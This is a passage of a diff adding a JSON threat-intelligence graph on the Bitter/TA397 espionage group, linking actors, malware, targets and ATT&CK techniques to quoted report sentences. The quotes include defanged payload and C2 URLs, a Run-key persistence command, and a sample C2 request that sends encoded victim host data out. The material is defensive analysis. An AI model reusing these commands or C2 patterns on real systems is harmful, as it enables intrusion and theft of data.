+              "For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems, Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files, which allow users to connect with data stored in web services or remote storage locations."
+            ],
+            [
+              30,
+              "In this campaign, TA397 exploited CVE-2024-43572, otherwise known as GrimResource, which is a vulnerability that provides attackers remote code execution in the context of mmc.exe on targeted endpoints."
+            ],
+            [
+              35,
+              "In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from:\nhxxp://173.254.204[.]72/dune64.log\nHowever, this request returned a 404 error as the attackers had not placed a file with that name on their server – making the rename command and the execution of shh.exe fail."
+            ],
+            [
+              42,
+              "As seen from the response headers, the endpoint was modified 43 minutes after the initial enumeration of the infected machine, suggesting TA397 made a conscious decision to load a hand-picked payload to the staging infrastructure."
+            ],
+            [
+              46,
+              "TA397 is an espionage-focused threat actor that highly likely operates on behalf of an Indian intelligence organization."
+            ],
+            [
+              47,
+              "Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent."
+            ],
+            [
+              48,
+              "Masquerading as foreign offices, embassies, and government entities of Madagascar, Mauritius and more, indicates that TA397 not only has knowledge of legitimate affairs of those countries, but leverages this knowledge to bolster the legitimacy of its spearphishing operations."
+            ],
+            [
+              49,
+              "Moreover, the use of legitimate or spoofed decoy documents, subject lines, and body contents pertaining to internal or foreign government affairs demonstrates that TA397 is very familiar with the standard practices of government."
+            ],
+            [
+              50,
+              "Having likely legitimate internal documents issued by the Bangladeshi military and tax authorities is highly consistent with the assessment that TA397 carries out intelligence-based tasking for Indian state interests."
+            ],
+            [
+              52,
+              "This strongly suggests that TA397 is part of a tool sharing ecosystem among Indian state-backed actors."
+            ]
+          ],
+          "Bitter_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              9,
+              "Bitter, also known as T-APT-17, is a suspected South Asian threat actor."
+            ],
+            [
+              12,
+              "Bitter is mainly motivated by espionage."
+            ],
+            [
+              14,
+              "Bitter is known for exploiting known vulnerabilities in victims' environments."
+            ],
+            [
+              16,
+              "Bitter is known to target both mobile and desktop platforms."
+            ],
+            [
+              17,
+              "Their arsenal mainly contains Bitter RAT, Artra downloader, SlideRAT and AndroRAT."
+            ],
+            [
+              22,
+              "We assess with moderate confidence that this campaign is operated by Bitter based on the use of the same C2 IP address from previous campaigns and similarities in the decrypted strings of the payload, such as module names, payload executable name, paths and the constants."
+            ]
+          ],
+          "Bitter_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              0,
+              "TA397 (Bitter) is an espionage group with a long history of targeting South Asian entities."
+            ]
+          ],
+          "BITTER_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              0,
+              "Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader."
+            ],
+            [
+              3,
+              "This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations."
+            ],
+            [
+              4,
+              "Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia."
+            ],
+            [
+              5,
+              "This is the first reported instance of BITTER targeting Saudi Arabia."
+            ],
+            [
+              26,
+              "To date, the threat actor commonly referred to as BITTER continues to be active against various regions across the globe."
+            ]
+          ],
+          "T-APT-17_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              9,
+              "Bitter, also known as T-APT-17, is a suspected South Asian threat actor."
+            ]
+          ],
+          "Bitter APT group_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              0,
+              "Based on the similarities between the C2 server in this campaign with that of Bitter's previous campaign, we assess with moderate confidence that this campaign is operated by the Bitter APT group."
+            ],
+            [
+              1,
+              "Cisco Talos discovered an ongoing campaign operated by what we believe is the Bitter APT group since August 2021."
+            ]
+          ]
+        },
+        "alias": [
+          "Bitter",
+          "T-APT-17",
+          "Bitter APT group"
+        ]
+      },
+      {
+        "node_id": "HL_5e1b1e1af3d1",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Asia",
+        "edges": [],
+        "source": {
+          "Asia_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              8,
+              "While this is likely more indicative of visibility bias, most public reporting on the group details TA397’s activities against organizations in Asia."
+            ],
+            [
+              47,
+              "Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_727ff6c5d7e1",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "ArtraDownloader",
+        "edges": [
+          "EDGE_4b0a450bba11",
+          "EDGE_5f92b5aafe1e",
+          "EDGE_87be49dcbd21"
+        ],
+        "source": {
+          "ArtraDownloader_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              20,
+              "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+            ],
+            [
+              21,
+              "In historical operations, ArtraDownloader encoded both the username and the computer name of the infected machine within the HTTP(S) POST C2 beacon."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_7bab665de99d",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Bangladeshi military",
+        "edges": [],
+        "source": {
+          "Bangladeshi military_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              50,
+              "Having likely legitimate internal documents issued by the Bangladeshi military and tax authorities is highly consistent with the assessment that TA397 carries out intelligence-based tasking for Indian state interests."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_903464adf545",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Proofpoint",
+        "edges": [],
+        "source": {
+          "Proofpoint_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              6,
+              "Proofpoint has observed TA397 frequently targeting an exceedingly small subset of targets."
+            ],
+            [
+              20,
+              "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+            ],
+            [
+              24,
+              "For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems, Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files, which allow users to connect with data stored in web services or remote storage locations."
+            ],
+            [
+              37,
+              "When Proofpoint analysts executed the shh.exe payload alongside the dune64.bin binary, the full chain executed correctly."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9ba9f69ccca5",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Beijing",
+        "edges": [],
+        "source": {
+          "Beijing_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a2567a854dd3",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Mauritius",
+        "edges": [],
+        "source": {
+          "Mauritius_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              48,
+              "Masquerading as foreign offices, embassies, and government entities of Madagascar, Mauritius and more, indicates that TA397 not only has knowledge of legitimate affairs of those countries, but leverages this knowledge to bolster the legitimacy of its spearphishing operations."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ab52a9c5071a",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Havoc C2 framework",
+        "edges": [],
+        "source": {
+          "Havoc C2 framework_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              38,
+              "Analysis of these payloads allowed us to identify shh.exe as KugelBlitz and dune64.bin as the Demon agent from the Havoc C2 framework."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_b471d54f5911",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "BDarkRAT",
+        "edges": [],
+        "source": {
+          "BDarkRAT_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              43,
+              "It is likely this payload selection is directly correlated to target selection and information gleaned from initial enumeration.The final payload of this campaign turned out to be BDarkRAT, which can be found in part two of this post on Threatray’s blog."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c2ddf6dc0961",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Mysterious Elephant/APT-K-47",
+        "edges": [],
+        "source": {
+          "Mysterious Elephant/APT-K-47_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              51,
+              "As covered in part two of this blog series with Threatray, there is also overlap of tooling with other known Indian threat actors, Mysterious Elephant/APT-K-47 and Confucius through the use of ORPCBackdoor."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c506f31b70a7",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Ministry of Foreign Affairs of the Republic of Korea",
+        "edges": [],
+        "source": {
+          "Ministry of Foreign Affairs of the Republic of Korea_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c821d33d685d",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Chinese government",
+        "edges": [],
+        "source": {
+          "Chinese government_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_cfbae3728144",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "StrikeReady Labs",
+        "edges": [],
+        "source": {
+          "StrikeReady Labs_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              20,
+              "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_d13202a98770",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "ORPCBackdoor",
+        "edges": [],
+        "source": {
+          "ORPCBackdoor_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              51,
+              "As covered in part two of this blog series with Threatray, there is also overlap of tooling with other known Indian threat actors, Mysterious Elephant/APT-K-47 and Confucius through the use of ORPCBackdoor."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_d338c0c71b7f",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Bitdefender",
+        "edges": [],
+        "source": {
+          "Bitdefender_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              44,
+              "Timezone analysis has proven to be a successful method for attributing espionage groups—not only for Asian espionage groups, but also specifically for TA397, as demonstrated by Bitdefender in 2020, and during our observations of hands-on-keyboard activity."
+            ],
+            [
+              45,
+              "In the Bitdefender research, analysis of the creation timestamps of code-signing certificates used in TA397 malware, as well as ZIP file timestamps for samples, revealed that they mapped to Indian Standard Time (UTC +5:30) and followed a 9-to-5, Monday-to-Friday working schedule."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_d6ae312dff4a",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "KugelBlitz",
+        "edges": [],
+        "source": {
+          "KugelBlitz_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              38,
+              "Analysis of these payloads allowed us to identify shh.exe as KugelBlitz and dune64.bin as the Demon agent from the Havoc C2 framework."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e0df37fa5c3d",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Confucius",
+        "edges": [],
+        "source": {
+          "Confucius_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              51,
+              "As covered in part two of this blog series with Threatray, there is also overlap of tooling with other known Indian threat actors, Mysterious Elephant/APT-K-47 and Confucius through the use of ORPCBackdoor."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e81344b1e2fb",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Foreign Affairs Office in Beijing",
+        "edges": [],
+        "source": {
+          "Foreign Affairs Office in Beijing_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ec5e76fc2a19",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "South America",
+        "edges": [],
+        "source": {
+          "South America_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              7,
+              "Geographically, this targeting is also almost exclusively observed against European entities with links to China or India’s neighbors, with some targeting also observed in China and South America."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f705aa3b174f",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Embassy of Mauritius in China",
+        "edges": [],
+        "source": {
+          "Embassy of Mauritius in China_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ]
+          ]
+        }
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1036",
+        "ttp_id": "T1036",
+        "best_span_sentences_list": [
+          [
+            "The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ]
+        ],
+        "edges": [
+          "EDGE_2247b2099edc",
+          "EDGE_d0528b141b90"
+        ],
+        "source": {
+          "TTP:T1036_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools."
+              ]
+            ]
+          },
+          "TTP:T1036_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                15,
+                15
+              ],
+              [
+                48,
+                48
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+              ],
+              [
+                "Masquerading as foreign offices, embassies, and government entities of Madagascar, Mauritius and more, indicates that TA397 not only has knowledge of legitimate affairs of those countries, but leverages this knowledge to bolster the legitimacy of its spearphishing operations."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools."
+          ],
+          [
+            "We noticed that the actor is using the cURL command-line utility to download the payload in the Windows environment."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ],
+          [
+            31,
+            31
+          ]
+        ],
+        "edges": [
+          "EDGE_3ad865936259",
+          "EDGE_cb14a8dceebf"
+        ],
+        "source": {
+          "TTP:T1059_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ],
+              [
+                31,
+                31
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools."
+              ],
+              [
+                "We noticed that the actor is using the cURL command-line utility to download the payload in the Windows environment."
+              ]
+            ]
+          },
+          "TTP:T1059_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                30,
+                30
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path."
+              ]
+            ]
+          },
+          "TTP:T1059_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                35,
+                35
+              ],
+              [
+                40,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from:\nhxxp://173.254.204[.]72/dune64.log\nHowever, this request returned a 404 error as the attackers had not placed a file with that name on their server – making the rename command and the execution of shh.exe fail."
+              ],
+              [
+                "The email contained a RAR compressed CHM file.",
+                "If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "The adversary typically downloads malware onto compromised endpoints from their hosting server via HTTP and uses DNS to establish contact with the command and control."
+          ],
+          [
+            "The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx."
+          ],
+          [
+            "For C2 communication, first, the trojan sends the victim's computer name, user name, a separator \"ZxxZ\" and the Windows version pulled from the registry.",
+            "The server responds back with data in the format <id><user>:\"<Program name\">.",
+            "Next, the malware requests the program data.",
+            "The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            13,
+            13
+          ],
+          [
+            28,
+            28
+          ],
+          [
+            35,
+            38
+          ]
+        ],
+        "edges": [
+          "EDGE_18dfb78659e5",
+          "EDGE_01e40a1561c2",
+          "EDGE_286d35d2237d",
+          "EDGE_77835f43b485",
+          "EDGE_ac4ee58e64c1",
+          "EDGE_c07997950918",
+          "EDGE_d99f273dc993",
+          "EDGE_43c2e859bdd3",
+          "EDGE_4b0a450bba11",
+          "EDGE_995d9873a7e6"
+        ],
+        "source": {
+          "TTP:T1071_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                13,
+                13
+              ],
+              [
+                28,
+                28
+              ],
+              [
+                35,
+                38
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The adversary typically downloads malware onto compromised endpoints from their hosting server via HTTP and uses DNS to establish contact with the command and control."
+              ],
+              [
+                "The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx."
+              ],
+              [
+                "For C2 communication, first, the trojan sends the victim's computer name, user name, a separator \"ZxxZ\" and the Windows version pulled from the registry.",
+                "The server responds back with data in the format <id><user>:\"<Program name\">.",
+                "Next, the malware requests the program data.",
+                "The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>."
+              ]
+            ]
+          },
+          "TTP:T1071_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ],
+              [
+                17,
+                17
+              ],
+              [
+                20,
+                20
+              ],
+              [
+                33,
+                33
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload."
+              ],
+              [
+                "In this case it was observed using the command and control domain of hewle.kielsoservice[.]net/Engset.php."
+              ],
+              [
+                "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+              ],
+              [
+                "The following example GET request is made to the remote C2 server:\nGET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1\nHost: frameworksupport[.]net\nConnection: close\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte."
+              ]
+            ]
+          },
+          "TTP:T1071_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                21,
+                21
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In historical operations, ArtraDownloader encoded both the username and the computer name of the infected machine within the HTTP(S) POST C2 beacon."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1082",
+        "ttp_id": "T1082",
+        "best_span_sentences_list": [
+          [
+            "For C2 communication, first, the trojan sends the victim's computer name, user name, a separator \"ZxxZ\" and the Windows version pulled from the registry."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            35,
+            35
+          ]
+        ],
+        "edges": [
+          "EDGE_5a679a1b915f",
+          "EDGE_296bbe6f70fc"
+        ],
+        "source": {
+          "TTP:T1082_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                35,
+                35
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "For C2 communication, first, the trojan sends the victim's computer name, user name, a separator \"ZxxZ\" and the Windows version pulled from the registry."
+              ]
+            ]
+          },
+          "TTP:T1082_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                31,
+                31
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Various information about the victim machine is collected, including information about the operating system, the machine’s GUID, as well as the hostname."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1090",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1090",
+        "ttp_id": "T1090",
+        "best_span_sentences_list": [
+          [
+            "In this case, we believe that the actor is using the AWS Global Accelerator to redirect traffic to their actual C2 host, which is parked behind the legitimate AWS service."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ]
+        ],
+        "edges": [
+          "EDGE_06e2f5bd0d8d",
+          "EDGE_f0594fdbf1af"
+        ],
+        "source": {
+          "TTP:T1090_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In this case, we believe that the actor is using the AWS Global Accelerator to redirect traffic to their actual C2 host, which is parked behind the legitimate AWS service."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools."
+          ],
+          [
+            "The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx.",
+            "The payload is downloaded in the folder \"C:\\$Utf\" created by the shellcode and runs as a process on the victim's machine."
+          ],
+          [
+            "We noticed that the actor is using the cURL command-line utility to download the payload in the Windows environment."
+          ],
+          [
+            "Next, the malware requests the program data.",
+            "The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>.",
+            "It then saves the file to %LOCALAPPDATA%\\Debug\\<program name>.exe and tries to execute it."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ],
+          [
+            28,
+            29
+          ],
+          [
+            31,
+            31
+          ],
+          [
+            37,
+            39
+          ]
+        ],
+        "edges": [
+          "EDGE_078f029bf19d",
+          "EDGE_09565894f2da",
+          "EDGE_59b4ebe5e532",
+          "EDGE_6d7260192d42",
+          "EDGE_8dd387689786",
+          "EDGE_d54f777ba570",
+          "EDGE_065e7814fa75",
+          "EDGE_32a2042b6388",
+          "EDGE_69c1043336d0",
+          "EDGE_6e56e6a61a1d",
+          "EDGE_ce624a1ad635",
+          "EDGE_db83eef9cda6",
+          "EDGE_ed1d88571042",
+          "EDGE_5f92b5aafe1e",
+          "EDGE_5fd5f258657a",
+          "EDGE_622072d95361",
+          "EDGE_c3e655cafcad"
+        ],
+        "source": {
+          "TTP:T1105_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ],
+              [
+                28,
+                29
+              ],
+              [
+                31,
+                31
+              ],
+              [
+                37,
+                39
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools."
+              ],
+              [
+                "The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx.",
+                "The payload is downloaded in the folder \"C:\\$Utf\" created by the shellcode and runs as a process on the victim's machine."
+              ],
+              [
+                "We noticed that the actor is using the cURL command-line utility to download the payload in the Windows environment."
+              ],
+              [
+                "Next, the malware requests the program data.",
+                "The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>.",
+                "It then saves the file to %LOCALAPPDATA%\\Debug\\<program name>.exe and tries to execute it."
+              ]
+            ]
+          },
+          "TTP:T1105_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ],
+              [
+                7,
+                7
+              ],
+              [
+                9,
+                12
+              ],
+              [
+                14,
+                14
+              ],
+              [
+                20,
+                20
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations."
+              ],
+              [
+                "Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload."
+              ],
+              [
+                "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.",
+                "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload.",
+                "One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability CVE-2017-11882.",
+                "This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net."
+              ],
+              [
+                "On December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the document cocktail and the dinner in the last week of dec.doc."
+              ],
+              [
+                "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+              ]
+            ]
+          },
+          "TTP:T1105_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ],
+              [
+                35,
+                35
+              ],
+              [
+                40,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
